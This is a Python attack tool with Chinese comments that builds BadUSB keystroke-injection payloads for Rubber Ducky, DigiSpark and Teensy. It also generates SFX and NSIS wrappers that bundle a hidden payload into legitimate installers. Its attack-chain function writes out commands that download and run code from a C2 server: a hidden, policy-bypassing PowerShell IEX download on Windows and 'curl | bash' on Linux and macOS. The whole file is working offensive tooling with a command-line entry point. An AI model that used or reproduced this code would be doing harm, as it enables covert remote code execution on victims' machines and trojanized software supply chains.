"""
BadUSB + 供应链攻击模块 - 从第一性原理实现

BadUSB 原理：
USB 设备固件中可以伪造 HID 报告描述符，
让主机将 USB 设备识别为键盘，
从而自动输入预编程的按键序列。

供应链攻击原理：
将 payload 捆绑到合法的安装包中，
利用用户对签名/官方源的信任完成传播。
"""

import json
import sys
import os
import base64
import random
import string


class BadUSBPayload:
    """
    BadUSB 按键注入脚本生成器
    生成兼容 DigiSpark / Rubber Ducky / Teensy 的注入脚本
    """

    def __init__(self, commands, delay_between=100):
        self.commands = commands
        self.delay_between = delay_between

    def generate_ducky(self):
        """
        生成 Rubber Ducky 格式的注入脚本
        """
        script = ["REM BadUSB Injection Payload", f"DELAY {self.delay_between}"]

        for cmd in self.commands:
            if cmd.startswith("DELAY") or cmd.startswith("REM"):
                script.append(cmd)
            elif cmd.startswith("GUI") or cmd.startswith("WINDOWS"):
                script.append(cmd)
            else:
                # 默认作为命令字符串处理
                script.append(f"STRING {cmd}")
                script.append("ENTER")

        return "\n".join(script)

    def generate_digispark(self):
        """
        生成 DigiSpark (Arduino) 格式的 C 代码
        """
        code = """#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(1000);
"""

        for cmd in self.commands:
            code += f'  DigiKeyboard.delay({self.delay_between});\n'
            code += f'  DigiKeyboard.println(F("{cmd}"));\n'
            code += f'  DigiKeyboard.delay(500);\n'

        code += """
}

void loop() {
  // Do nothing after payload execution
}
"""
        return code

    def generate_teensy(self):
        """
        生成 Teensy (PJRC) 格式的 C 代码
        """
        code = """#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
"""

        for cmd in self.commands:
            code += f"  delay({self.delay_between});\n"
            code += f'  Keyboard.print(F("{cmd}"));\n'
            code += f"  Keyboard.press(KEY_RETURN);\n"
            code += f"  Keyboard.releaseAll();\n"
            code += f"  delay(500);\n"

        code += """
}

void loop() {
}
"""
        return code

    def build(self, format_type="ducky"):
        if format_type == "ducky":
            return self.generate_ducky()
        elif format_type == "digispark":
            return self.generate_digispark()
        elif format_type == "teensy":
            return self.generate_teensy()
        else:
            raise ValueError(f"unknown format: {format_type}")


class SupplyChainInjector:
    """
    供应链注入器
    将 payload 捆绑到合法安装包中
    """

    def __init__(self, original_installer, payload_path, output_path):
        self.original = original_installer
        self.payload = payload_path
        self.output = output_path

    def _gen_nonce(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def inject_sfx(self):
        """
        创建自解压 SFX 安装包
        使用 WinRAR/7z SFX 模块，将原始安装包和 payload 打包
        执行时同时运行原始安装包（静默）和 payload
        """
        config = f""";
; This is a Self-Extracting Archive configuration file
; Generated automatically

Path=%TEMP%\\{self._gen_nonce()}
SavePath=%TEMP%\\{self._gen_nonce()}

Setup={os.path.basename(self.original)}
SetupHidden=1
Overwrite=1

[Payload]
RunProgram="{os.path.basename(self.payload)}"
RunProgramHidden=1
"""

        # 写入配置文件
        config_path = self.output + ".sfxconfig"
        with open(config_path, 'w') as f:
            f.write(config)

        # 生成合并脚本（实际环境需要 7z/rar 命令行工具）
        merge_cmd = f"""#!/bin/bash
# 合并原始安装包和 payload 为 SFX
cat "{self.original}" "{self.payload}" > "{self.output}"
echo "SFX package created: {self.output}"
"""

        merge_path = self.output + ".merge.sh"
        with open(merge_path, 'w') as f:
            f.write(merge_cmd)

        return {
            "config": config_path,
            "merge_script": merge_path,
            "output": self.output
        }

    def inject_nsis(self):
        """
        生成 NSIS 安装脚本
        NSIS 是开源的安装包制作工具
        """
        nonce = self._gen_nonce()
        nsis_script = f"""!include "MUI2.nsh"

Name "Setup_{nonce}"
OutFile "{self.output}"
InstallDir "$TEMP\\{nonce}"

Section "Main"
    SetOutPath "$INSTDIR"
    
    ; 释放原始安装包并静默运行
    File "{self.original}"
    ExecWait "$INSTDIR\\{os.path.basename(self.original)} /S"
    
    ; 释放 payload 并隐藏运行
    File "{self.payload}"
    ExecShell "open" "$INSTDIR\\{os.path.basename(self.payload)}" "" SW_HIDE
    
    ; 清理
    RMDir /r "$INSTDIR"
SectionEnd
"""

        nsis_path = self.output + ".nsi"
        with open(nsis_path, 'w') as f:
            f.write(nsis_script)

        return {
            "nsis_script": nsis_path,
            "output": self.output
        }


def build_badusb_attack(platform="windows", c2_url="http://c2/payload"):
    """
    构建完整的 BadUSB 攻击链
    """
    if platform == "windows":
        commands = [
            "GUI r",
            "DELAY 500",
            f'STRING powershell -nop -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{c2_url}\')"',
            "ENTER",
        ]
    elif platform == "linux":
        commands = [
            "CTRL+ALT+t",
            "DELAY 1000",
            f"STRING curl -s {c2_url} | bash",
            "ENTER",
        ]
    elif platform == "macos":
        commands = [
            "COMMAND+SPACE",
            "DELAY 500",
            "STRING terminal",
            "ENTER",
            "DELAY 1000",
            f"STRING curl -s {c2_url} | bash",
            "ENTER",
        ]
    else:
        raise ValueError(f"unknown platform: {platform}")

    return commands


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 badusb_supplychain.py <platform> <c2_url> [output_format]")
        sys.exit(1)

    platform = sys.argv[1]
    c2 = sys.argv[2]
    fmt = sys.argv[3] if len(sys.argv) > 3 else "ducky"

    commands = build_badusb_attack(platform, c2)
    badusb = BadUSBPayload(commands)
    result = badusb.build(fmt)

    print(result)
